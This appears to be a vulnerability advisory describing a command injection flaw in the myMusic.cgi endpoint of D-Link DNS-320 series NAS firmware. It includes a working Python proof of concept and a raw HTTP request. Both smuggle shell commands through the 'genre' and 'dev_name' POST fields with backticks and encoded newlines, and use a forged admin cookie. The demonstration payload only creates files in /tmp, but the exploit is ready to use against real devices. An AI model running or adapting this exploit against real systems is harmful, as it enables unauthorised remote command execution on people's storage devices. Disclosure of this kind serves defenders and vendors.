# Overview
Firmware download website:
 [https://ftp.dlink.ru/pub/NAS/](https://ftp.dlink.ru/pub/NAS/)
# Affected version
DLINK DNS-320/320L/321/323/325/327L all versions of the firmware
# Vulnerability details
The DLINK nas DNS-320/320L/321/323/325/327L  all firmware version has a command injection vulnerability in cgi_get_genre_all_tracks function of the file /cgi-bin/myMusic.cgi.  The variable `genre`is passed from a POST request and is assigned to `v5` via the `sprintf` function at line 30 and invoked by the `popen` command, it can lead to command execution. 

![image.png](https://cdn.nlark.com/yuque/0/2024/png/2771021/1723717232503-abf8147b-2174-4ef3-92a7-82d68ac57f82.png#averageHue=%23fdfdfa&clientId=uc1af639a-ad9b-4&from=paste&height=243&id=u147aa455&originHeight=243&originWidth=876&originalType=binary&ratio=1&rotation=0&showTitle=false&size=37767&status=done&style=none&taskId=u380474c4-df86-45ce-9ed5-fdc20465804&title=&width=876)
# POC
```python
import requests

url = "http://192.168.0.32/cgi-bin/myMusic.cgi"
headers = {
    "Host": "192.168.0.32",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/x-www-form-urlencoded",
    "X-Requested-With": "XMLHttpRequest",
    "Origin": "http://192.168.0.32",
    "Connection": "close",
    "Referer": "http://192.168.0.32/photo_center/index.html",
    "Cookie": "username=admin",
    "Priority": "u=1"
}

data = "cmd=cgi_get_genre_all_tracks&ptype=clean&genre=`touch%09/tmp/119`&type=1&user=photos&idx=10&dev_name=%0atouch%09/tmp/118%0a&dev_type=10&page=19&r=/tmp/"
response = requests.post(url, headers=headers, data=data)
print(response.text)

```

```
POST /cgi-bin/myMusic.cgi HTTP/1.1
Host: 192.168.0.32
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Content-Length: 110
Origin: http://192.168.0.32
Connection: close
Cookie: username=admin
Priority: u=1

cmd=cgi_get_genre_all_tracks&ptype=clean&genre=`touch%09/tmp/119`&type=1&user=photos&idx=10&dev_name=%0atouch%09/tmp/118%0a&dev_type=10&page=19&r=/tmp/
```

